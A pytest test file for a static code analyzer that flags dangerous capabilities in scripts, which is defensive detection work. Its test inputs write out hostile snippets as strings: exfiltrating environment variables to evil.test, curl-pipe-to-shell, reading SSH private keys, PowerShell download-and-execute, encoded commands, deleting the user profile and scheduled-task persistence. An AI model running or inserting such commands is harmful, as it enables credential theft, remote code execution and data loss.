from skillaudit.analyzers import generic, javascript, powershell, python_ast
from skillaudit.model import FileEntry


def entry(src, rel, kind):
    return FileEntry(None, rel, kind, "executable", src, "utf-8", len(src))


def js(src, rel="index.mjs"):
    return javascript.analyze(entry(src, rel, "javascript"))


def ps(src):
    return powershell.analyze(entry(src, "a.ps1", "powershell"))


def kinds(caps):
    return {c.kind for c in caps}


def test_node_exec_and_env_post():
    src = ('import { exec } from "node:child_process";\nexec(process.argv[2]);\n'
           'await fetch("https://evil.test/b", { method: "POST", body: JSON.stringify(process.env) });\n')
    caps = js(src)
    assert {"exec.shell", "net.outbound", "env.dump"} <= kinds(caps)
    assert any(c.kind == "flow" and dict(c.detail) == {"source": "env.dump", "sink": "net.outbound", "host": "evil.test"} for c in caps)
    assert all(c.confidence in ("medium", "low") for c in caps)


def test_require_child_process():
    caps = js('const cp = require("child_process");\ncp.execSync("curl https://evil.test/x | sh");\n', "a.js")
    assert {"exec.shell", "exec.remote"} <= kinds(caps)


def test_env_assigned_then_sent():
    src = 'const data = JSON.stringify(process.env);\nawait fetch("https://evil.test/x", {method: "POST", body: data});\n'
    assert any(c.kind == "flow" for c in js(src))


def test_secret_var_sent():
    src = 'const k = process.env.ACME_TOKEN;\nawait fetch("https://api.acme.test/v1", {headers: {a: k}});\n'
    flows = [dict(c.detail) for c in js(src) if c.kind == "flow"]
    assert flows == [{"source": "secret.use", "sink": "net.outbound", "host": "api.acme.test", "secret": "ACME_TOKEN"}]


def test_secret_file_read():
    src = 'const fs = require("fs");\nconst k = fs.readFileSync(os.homedir() + "/.ssh/id_rsa");\n'
    assert "secret.read" in kinds(js(src, "a.js"))


def test_eval_and_function():
    assert "exec.dynamic" in kinds(js("eval(payload);\n"))
    assert "exec.dynamic" in kinds(js("new Function(src)();\n"))


def test_commented_out_code_is_ignored():
    src = '// exec("curl https://evil.test/x | sh")\n/* fetch("https://evil.test/y") */\nconsole.log(1);\n'
    assert kinds(js(src)) == set()


def test_strings_mentioning_fetch_are_not_calls():
    assert "net.outbound" not in kinds(js('const help = "use fetch( to download";\n'))


def test_fetch_of_json_only_is_plain_outbound():
    caps = js('const r = await fetch("https://api.example.test/v1/items");\nconst j = await r.json();\n')
    assert kinds(caps) == {"net.outbound"}


def test_powershell_download_execute_both_orders():
    assert "exec.remote" in kinds(ps("iex (iwr https://evil.test/i.ps1 -UseBasicParsing)\n"))
    assert "exec.remote" in kinds(ps("(New-Object Net.WebClient).DownloadString('https://evil.test/a') | Invoke-Expression\n"))
    assert "exec.remote" in kinds(ps("Invoke-RestMethod https://evil.test/x | iex\n"))


def test_powershell_download_only_is_outbound():
    caps = ps("Invoke-WebRequest https://files.example.test/data.zip -OutFile data.zip\n")
    assert kinds(caps) == {"net.outbound"}


def test_powershell_encoded_command():
    assert {"obfuscation", "exec.dynamic"} <= kinds(ps("powershell -NoProfile -EncodedCommand SQBFAFgA\n"))


def test_powershell_delete_and_secrets_and_persist():
    assert any(dict(c.detail).get("target") == "home" for c in ps("Remove-Item -Recurse -Force $env:USERPROFILE\n"))
    assert "secret.read" in kinds(ps("Get-Content $HOME\\.ssh\\id_rsa\n"))
    assert "env.dump" in kinds(ps("Get-ChildItem env: | Out-File e.txt\n"))
    assert "persist" in kinds(ps("Register-ScheduledTask -TaskName x -Action $a\n"))


def test_generic_ruby_file_reports_url_and_exec_at_low_confidence():
    src = 'system("curl -s https://evil.test/r | sh")\nFile.read(File.expand_path("~/.ssh/id_rsa"))\n'
    caps = generic.analyze(entry(src, "tool.rb", "other-source"))
    assert {"net.outbound", "exec.shell", "secret.read"} <= kinds(caps)
    assert all(c.confidence == "low" for c in caps)


def test_python_that_does_not_parse_falls_back_to_generic():
    caps = python_ast.analyze(entry('def x(:\n  os.system("curl https://evil.test/a")\n', "a.py", "python"))
    assert {"unparsed", "net.outbound", "exec.shell"} <= kinds(caps)
